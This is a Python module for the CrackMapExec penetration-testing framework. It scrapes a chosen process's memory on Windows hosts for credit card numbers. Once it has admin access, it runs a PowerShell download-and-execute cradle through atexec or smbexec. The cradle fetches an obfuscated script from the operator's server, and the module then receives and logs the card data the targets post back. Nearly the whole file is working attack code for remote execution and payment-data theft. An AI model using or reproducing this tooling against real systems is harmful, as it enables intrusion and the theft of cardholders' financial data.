from cme.helpers import create_ps_command, obfs_ps_script, get_ps_script, write_log, gen_random_string
from StringIO import StringIO
from datetime import datetime
from sys import exit

class CMEModule:
    '''
        Scrapes memory of a specified process and looks for credit card numbers
        Module by @byt3bl33d3r

        Original Powershell Script from https://github.com/Shellntel/scripts
        Blog Post: http://www.shellntel.com/blog/2015/9/16/powershell-cc-memory-scraper
    '''

    name = 'mem_scraper'

    description = "Scrapes memory of a specified process and looks for credit card numbers"

    def options(self, context, module_options):
        '''
            PROC  Process name to scrape
        '''

        self.process = None
        if not 'PROC' in module_options:
            context.log.error('PROC option is required!')
            exit(1)

        if 'PROC' in module_options:
            self.process = module_options['PROC']

        self.obfs_name = gen_random_string()

    def on_admin_login(self, context, connection):

        payload = '''
        IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/mem_scraper.ps1');
        Invoke-{func_name} -DumpFilePath %SystemRoot%\Temp -Proc {process} -LogUrl {server}://{addr}:{port}
        '''.format(server=context.server,  
                  port=context.server_port, 
                  addr=context.localip,
                  process=self.process,
                  func_name=self.obfs_name)

        context.log.debug('Payload: {}'.format(payload))
        payload = create_ps_command(payload)
        connection.execute(payload, methods=['atexec', 'smbexec'])
        context.log.success('Executed payload')

    def on_request(self, context, request):
        if 'mem_scraper.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            with open(get_ps_script('mem_scraper.ps1'), 'r') as ps_script:
                ps_script = obfs_ps_script(ps_script.read(), self.obfs_name)
                request.wfile.write(ps_script)

        else:
            request.send_response(404)
            request.end_headers()

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.getheader('content-length'))
        data = response.rfile.read(length)

        if len(data):
            def print_post_data(data):
                buf = StringIO(data.strip()).readlines()
                for line in buf:
                    context.log.highlight(line.strip())

            print_post_data(data)

            log_name = 'MemScraper-{}-{}.log'.format(response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
            write_log(data, log_name)
            context.log.info("Saved output to {}".format(log_name))